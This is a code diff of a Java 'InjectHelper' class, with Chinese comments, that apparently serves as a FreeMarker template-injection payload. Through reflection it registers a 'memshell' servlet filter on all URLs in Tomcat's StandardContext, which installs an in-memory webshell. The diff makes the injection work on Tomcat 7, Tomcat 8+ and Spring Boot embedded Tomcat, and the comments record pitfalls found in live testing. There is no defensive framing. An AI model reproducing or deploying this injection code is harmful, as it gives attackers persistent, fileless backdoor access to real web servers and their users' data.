@@ -78,7 +78,11 @@ public class InjectHelper implements TemplateMethodModelEx {
         invoke(filter, "init", new Class<?>[]{javax.servlet.FilterConfig.class}, new Object[]{null});
 
         // --- FilterDef ---
-        Class<?> filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
+        // 坑：Tomcat 7 是 org.apache.catalina.deploy.FilterDef，
+        //     Tomcat 8+ 挪到了 org.apache.tomcat.util.descriptor.web.FilterDef。
+        Class<?> filterDefClass = loadFirst(
+                "org.apache.tomcat.util.descriptor.web.FilterDef",
+                "org.apache.catalina.deploy.FilterDef");
         Object filterDef = filterDefClass.getDeclaredConstructor().newInstance();
         callSetter(filterDef, "setFilterName", FILTER_NAME);
         callSetter(filterDef, "setFilter", filter);
@@ -87,7 +91,9 @@ public class InjectHelper implements TemplateMethodModelEx {
         invoke(standardContext, "addFilterDef", new Class<?>[]{filterDefClass}, new Object[]{filterDef});
 
         // --- FilterMap: 映射到 /* ---
-        Class<?> filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
+        Class<?> filterMapClass = loadFirst(
+                "org.apache.tomcat.util.descriptor.web.FilterMap",
+                "org.apache.catalina.deploy.FilterMap");
         Object filterMap = filterMapClass.getDeclaredConstructor().newInstance();
         callSetter(filterMap, "setFilterName", FILTER_NAME);
         if (!callSetterIfPresent(filterMap, "addURLPattern", String.class, URL_PATTERN)) {
@@ -115,32 +121,64 @@ public class InjectHelper implements TemplateMethodModelEx {
                 + " | filterLoader=" + memshell.getClassLoader();
     }
 
-    /** ServletContext(ApplicationContextFacade) -> ApplicationContext -> StandardContext */
+    /**
+     * ServletContext(ApplicationContextFacade) -> ApplicationContext -> StandardContext
+     *
+     * 坑：Spring Boot 内嵌 Tomcat 的 StandardContext 实际是
+     * org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedContext（StandardContext 的子类），
+     * 所以<b>不能用 className.equals("org.apache.catalina.core.StandardContext")</b> 去判等，
+     * 否则永远解析不到。必须用 isAssignableFrom / isInstance —— 这是本次实测踩到的坑。
+     */
     private static Object contextFrom(Object servletContext) {
         if (servletContext == null) {
             return null;
         }
-        StringBuilder trace = new StringBuilder();
-        if (servletContext.getClass().getName().equals("org.apache.catalina.core.StandardContext")) {
+        Class<?> standardContextClass = standardContextClass();
+        if (standardContextClass == null) {
+            return null;
+        }
+        if (standardContextClass.isInstance(servletContext)) {
             return servletContext;
         }
+        StringBuilder trace = new StringBuilder();
         Object o = servletContext;
         for (int i = 0; i < 4; i++) {
             trace.append('[').append(i).append(']').append(o.getClass().getName());
             Object next = readField(o, "context");
             if (next == null) {
-                trace.append(" context=null(unreadable)");
+                trace.append(" context=null");
                 break;
             }
             trace.append(" context=").append(next.getClass().getName());
             o = next;
-            if (o.getClass().getName().equals("org.apache.catalina.core.StandardContext")) {
-                System.out.println("[memshell] context resolved via " + trace);
+            if (standardContextClass.isInstance(o)) {
+                System.out.println("[memshell] StandardContext resolved: " + trace
+                        + " -> " + o.getClass().getName());
                 return o;
             }
         }
         System.err.println("[memshell] cannot resolve StandardContext: " + trace);
         return null;
+    }
+
+    private static Class<?> standardContextClass() {
+        try {
+            return Class.forName("org.apache.catalina.core.StandardContext", false,
+                    InjectHelper.class.getClassLoader());
+        } catch (Throwable t) {
+            return null;
+        }
+    }
+
+    /** 按顺序尝试多个类名，返回第一个能加载到的（兼容 Tomcat 各版本的包名搬迁）。 */
+    private static Class<?> loadFirst(String... classNames) throws ClassNotFoundException {
+        for (String n : classNames) {
+            try {
+                return Class.forName(n, true, InjectHelper.class.getClassLoader());
+            } catch (ClassNotFoundException ignored) {
+            }
+        }
+        throw new ClassNotFoundException(classNames[0]);
     }
 
     private static Object readField(Object target, String name) {
@@ -271,10 +309,44 @@ public class InjectHelper implements TemplateMethodModelEx {
         }
     }
 
+    /**
+     * 调用 setter。
+     *
+     * 坑：不能直接 getMethod(name, value.getClass()) —— 例如
+     * FilterDef.setFilter(javax.servlet.Filter) 声明的形参是<b>接口</b>，
+     * 而手里的实例是 MemshellFilter，精确匹配会抛 NoSuchMethodException。
+     * 所以按「形参类型可从实参类型赋值」来挑重载。
+     */
     private static void callSetter(Object target, String setter, Object value) throws Exception {
-        Method m = target.getClass().getMethod(setter, value.getClass());
+        Method m = findSetter(target.getClass(), setter, value == null ? null : value.getClass());
+        if (m == null) {
+            throw new NoSuchMethodException(target.getClass().getName() + "." + setter + "(" + value + ")");
+        }
         m.setAccessible(true);
         m.invoke(target, value);
+    }
+
+    private static Method findSetter(Class<?> c, String setter, Class<?> argType) {
+        for (Method m : c.getMethods()) {
+            if (!m.getName().equals(setter) || m.getParameterTypes().length != 1) {
+                continue;
+            }
+            Class<?> p = m.getParameterTypes()[0];
+            if (argType == null || p.isAssignableFrom(argType) || (p.isPrimitive() && isBoxed(p, argType))) {
+                return m;
+            }
+        }
+        return null;
+    }
+
+    private static boolean isBoxed(Class<?> primitive, Class<?> boxed) {
+        if (primitive == boolean.class) {
+            return boxed == Boolean.class;
+        }
+        if (primitive == int.class) {
+            return boxed == Integer.class;
+        }
+        return false;
     }
 
     private static boolean callSetterIfPresent(Object target, String setter, Class<?> type, Object value) {
